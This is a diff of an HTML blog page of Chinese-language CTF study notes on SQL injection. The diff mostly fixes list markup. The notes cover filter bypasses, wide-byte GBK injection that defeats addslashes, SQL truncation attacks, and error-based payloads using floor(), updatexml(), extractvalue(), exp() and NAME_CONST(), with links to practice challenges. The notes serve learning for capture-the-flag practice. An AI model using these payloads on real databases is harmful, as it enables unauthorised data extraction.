@@ -16,7 +16,7 @@
 <meta property="og:description" content="记录CTF从入门到提高的学习过程">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-02-02T14:43:22.000Z">
-<meta property="article:modified_time" content="2020-02-02T15:18:41.045Z">
+<meta property="article:modified_time" content="2020-02-02T16:03:32.456Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -168,17 +168,23 @@
 <li>Jarvis OJ <a href="https://www.jarvisoj.com" target="_blank" rel="noopener">https://www.jarvisoj.com</a><h1 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h1></li>
 <li>‘ctf’ -&gt;0xhex(ctf)</li>
 <li>#-&gt;%23 或者使用 –+</li>
-<li>=被过滤，like/regexp/!!=/!&lt;&gt;<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="编码介绍"><a href="#编码介绍" class="headerlink" title="编码介绍"></a>编码介绍</h2></li>
+<li>=被过滤，like/regexp/!!=/!&lt;&gt;</li>
+</ul>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="编码介绍"><a href="#编码介绍" class="headerlink" title="编码介绍"></a>编码介绍</h2><ul>
 <li>ASCII编码的范围是0-127</li>
 <li>国际通用UTF-8编码</li>
 <li>中文常用GBK编码</li>
-<li>URL编码(常见的如%20、%27、%23、%5C)<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2>当MySQL使用gbk编码时，会认为两个字符是一个汉字，产生宽字节注入，第一个字节要大于128<h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2>addslashes常用来加\来转义特殊字符,绕过有以下两种思路</li>
+<li>URL编码(常见的如%20、%27、%23、%5C)</li>
 </ul>
+<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>当MySQL使用gbk编码时，会认为两个字符是一个汉字，产生宽字节注入，第一个字节要大于128</p>
+<h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><p>addslashes常用来加\来转义特殊字符,绕过有以下两种思路</p>
 <ol>
 <li>\前加一个\，形成\\‘,单引号就可以生效</li>
 <li>弄没转义的\ -&gt; 宽字节注入，原理如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\&#39; -&gt; \\&#39; -&gt;\%27</span><br><span class="line">%df&#39; -&gt; %df\&#39; -&gt; $df%5C%27</span><br></pre></td></tr></table></figure>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php</a></li>
+
+</li>
 </ol>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php</a></p>
 <h1 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h1><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><ul>
 <li>mysql在进行查询时会自动忽略空格</li>
 <li>长度有限制，大于长度会自动截断</li>
@@ -186,13 +192,16 @@
 </ul>
 <h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">http://123.206.31.85:49163/</a></p>
 <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h2><ul>
-<li>利用sql函数的错误用法使其报错<h2 id="常用报错函数"><a href="#常用报错函数" class="headerlink" title="常用报错函数"></a>常用报错函数</h2><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+<li>利用sql函数的错误用法使其报错</li>
+</ul>
+<h2 id="常用报错函数"><a href="#常用报错函数" class="headerlink" title="常用报错函数"></a>常用报错函数</h2><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+
 <h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or updatexml(1,concat(0x7e,(version())),0)</span><br></pre></td></tr></table></figure>
 <h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(select database())))</span><br></pre></td></tr></table></figure>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
 <h3 id="NAME-CONST"><a href="#NAME-CONST" class="headerlink" title="NAME_CONST()"></a>NAME_CONST()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select NAME_CONST(version(),1),NAME_CONST(version(),1))a;</span><br></pre></td></tr></table></figure>
-<h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a><br>,</li>
-</ul>
+
+<h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p><a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a><br>,</p>
 
       
       
